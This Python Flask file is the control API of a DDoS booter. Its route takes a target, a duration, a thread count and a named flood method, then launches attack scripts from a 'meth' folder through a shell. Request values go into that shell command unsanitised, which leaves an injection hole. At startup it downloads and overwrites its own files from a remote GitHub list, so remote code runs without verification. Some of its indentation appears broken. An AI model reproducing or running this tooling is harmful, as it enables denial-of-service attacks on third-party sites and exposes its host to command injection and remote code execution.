from flask import Flask,request

app = Flask(__name__)
import subprocess
import threading

def execute_command(command):subprocess.Popen(command, shell=True)

@app.route('/target=<TARGET>&time=<TIME>&threads=<THREAD>&methods=<METHODS>')
def req(TARGET, TIME, THREAD, METHODS):
    upper_methods = METHODS.upper()
    if upper_methods in ['HTTP-19', 'BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST','COOKIE2','COOKIE']:
        ports_opt = request.headers.get('X-Port')
        if ports_opt is None: ports_opt = 80
        meth_opt = request.headers.get('X-Methods')
        if meth_opt is None:
            if upper_methods not in ['BROWSER', 'HANDSHAKE', 'AMP', 'MURD-OPT','MURD','RAPID-FAST','COOKIE','COOKIE2']:meth_opt = 'POST'
            else:meth_opt = 'GET'
        protocols = request.headers.get('X-Protocols')
        if protocols is None:protocols = 'https'
        links = request.headers.get('X-Links')
        if links is None:links = '/'
        proxy = request.headers.get('X-Browser')
        com = ''
        folder = 'meth/'
        if upper_methods in ['HTTP-19']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {TARGET} {ports_opt} {THREAD} {TIME} {meth_opt}"
        elif upper_methods in ['AMP','HANDSHAKE']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt}"
        elif upper_methods == 'BROWSER':
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy} command.txt"
        elif upper_methods in ['COOKIE','COOKIE2']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {TIME} {meth_opt} {proxy}"
        elif upper_methods in ['MURD-OPT','MURD','RAPID-FAST']:
            com = f"python {folder}{upper_methods.replace('-','_')}.py {protocols}://{TARGET}{links} {THREAD} {meth_opt}"
        threading.Thread(target=execute_command,args=(com,)).start()
        return f'{METHODS} {THREAD}/{TIME}s HTTP={meth_opt} --> {TARGET}'
    else:return 'IDK'

import requests,json,datetime,hashlib

def datetime_to_epoch():
    date_string = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    date_obj = datetime.datetime.strptime(date_string, "%Y-%m-%d %H:%M:%S")
    return int(date_obj.timestamp())

def epoch_to_datetime(epoch_time):
    datetime_obj = datetime.datetime.fromtimestamp(epoch_time)
    return datetime_obj.strftime('%Y-%m-%d %H:%M:%S')

def link(path):return requests.get(f"https://raw.githubusercontent.com/Tool-Free/api_assets/main{path}").content

def read(path):
  try:
   with open(path,'r') as f:return f.read()
  except:
    try:
      with open(path,'rb') as f:return f.read()
    except:return False

def write(path,contents):
  try:
   with open(path,'w') as f:f.write(contents)
  except:
    with open(path,'wb') as f:f.write(contents)

def hash_checked(data,data2):
  try:update_data = hashlib.sha256(data.encode()).hexdigest()
  except:update_data = hashlib.sha256(data).hexdigest()
  if data2 != False:
   try:current_data = hashlib.sha256(data2.encode()).hexdigest()
   except:current_data = hashlib.sha256(data2).hexdigest()
   if current_data == update_data:return True
  return False

def list_update():
    c = 0
    while True:
     try:
        data = json.loads(link("/lst.json").decode()); break
     except Exception as e:
        print(f"[{epoch_to_datetime(datetime_to_epoch())}] REASON={e} ERROR CONTACT t.me/IDKOTHERHEX1629 FOR CHECK . . .")
    print(f"[{epoch_to_datetime(datetime_to_epoch())}] DOWNLOAD JSON DONE . . .")
    error = link("a")
    for a in data["LIST"].keys():
        files_c = a
       if "." not in a:
        name = ''
        lst = data['LIST'][a].split("/")
        c = 0
        while True:
         try:
           name = lst[c]; c += 1
         except:break
        files_c = name
       files = link(data['LIST'][a])
       if files == error:print(f"[{epoch_to_datetime(datetime_to_epoch())}] {a} ERROR PAGE 404 . . .")
       else:
           if hash_checked(files,read(files_c)) == False:threading.Thread(target=write,args=(files_c,files)).start(); print(f"[{epoch_to_datetime(datetime_to_epoch())}] {a} HAS BEEN UPDATE . . ."); c = 1
    if c == 1:return True

if list_update() == True:print("RESTART PROGRAM!")
else:
 app.run('0.0.0.0')
